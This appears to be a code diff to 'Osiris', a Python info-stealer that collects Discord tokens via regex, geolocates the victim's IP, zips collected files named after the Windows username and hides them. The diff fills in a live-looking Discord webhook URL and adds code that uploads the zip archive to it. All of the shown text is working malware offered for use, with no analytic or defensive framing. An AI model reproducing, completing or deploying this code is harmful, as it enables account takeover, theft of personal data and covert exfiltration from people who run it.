@@ -1,3 +1,4 @@
+from importlib.metadata import files
 import requests
 import re
 import os
@@ -12,7 +13,7 @@ def hide(file):
 
 def zipup():
         with ZipFile(f'Osiris - {os.getenv("Username")}.zip', 'w') as zipf:
-            zipf.write("google-passwords.txt")
+            zipf.write("ip-info.txt")
         hide(f'Osiris - {os.getenv("Username")}.zip')
 def headers_gen(token=None):
     
@@ -26,7 +27,7 @@ def headers_gen(token=None):
 
 class Osiris:
     def __init__(self):
-        self.webhook = "WEBHOOK_HERE"
+        self.webhook = "https://discord.com/api/webhooks/1015281877210365952/_SvCEoGvV4ZEmk4jhIb3Rwkdb4ZOc60lIxAWGoNA3o6aZX-zofq_SSRzSQZbrjXkxRgD"
         self.appdata = os.getenv("appdata")
         self.roaming = os.getenv("appdata")
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
@@ -38,7 +39,7 @@ class Osiris:
         self.region = ipdata[2]
         self.country = ipdata[3]
         self.org = ipdata[4]
-        headers_gen()
+        self.Files()
         self.SendInfo()
 
     def headers_gen(self, token=None):
@@ -63,6 +64,7 @@ class Osiris:
         region = r.json()['region']
         country = r.json()['country']
         org = r.json()['org']
+        
         return [ ip , city , region , country , org ]
 
     def Files(self):
@@ -101,9 +103,10 @@ class Osiris:
             }]
         }
 
-    
+        file = f'Osiris - {os.getenv("Username")}.zip'
 
         requests.post(self.webhook, json=embed)
-
+        with open(file, 'rb') as f:
+            requests.post(self.webhook, files={'upload_file': f})
 
 Osiris()
